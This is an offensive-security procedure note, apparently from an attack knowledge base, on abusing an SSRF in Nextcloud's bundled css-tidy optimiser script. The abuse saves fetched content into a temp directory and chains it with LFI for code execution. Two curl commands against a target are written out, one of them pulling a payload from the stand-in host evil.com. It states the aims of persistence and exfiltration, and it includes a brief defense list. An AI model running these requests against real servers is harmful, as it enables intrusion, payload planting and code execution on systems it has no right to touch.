---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
tags:
  - ssrf
  - file-download
  - rfi
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-css-download]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.587Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Download-Remote-Data-as-CSS

## Summary

This procedure uses the SSRF to download arbitrary remote or internal data as CSS files to the server's temporary directory, potentially chaining with LFI for RFI.

## Description

By combining the url parameter with custom=1 and template=4, the script processes and saves fetched content as a CSS file in /apps/mail/vendor/cerdic/css-tidy/temp/. This can pull sensitive internal files or external payloads, enabling persistence or further exploits like including the temp file via LFI elsewhere in Nextcloud.

## Requirements

1. Successful SSRF from previous step
2. Target URLs with CSS-like content or arbitrary data
3. Server write access to temp dir (default)

## Defense

Defensive measures and detection strategies:

- Sanitize and restrict file downloads in libraries
- Monitor temp directories for unexpected files
- Disable write access to vendor/temp paths

## Objectives

1. Persist remote data on server filesystem
2. Chain with LFI for code execution
3. Exfiltrate via downloaded content

## Instructions

### Step 1: Fetch and Save CSS

**Context**: Target an internal CSS file with parameters.

**Command** ([[commands/curl-css-download]]):
```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://target.com/apps/richdocuments/docs/custom.css&custom=1&template=4"
```

> Saves optimized CSS to temp/; response shows processed output.

### Step 2: Verify Download

**Context**: If server access, check temp dir; else infer from response.

**Command** ([[commands/curl-remote-fetch]]):
```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://evil.com/payload.css&custom=1&template=4"
```

> Downloads external payload as CSS, ready for LFI chaining.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-css-download]]
- [[commands/curl-remote-fetch]]

## Tools Used


## Tags

- ssrf
- file-download
- rfi

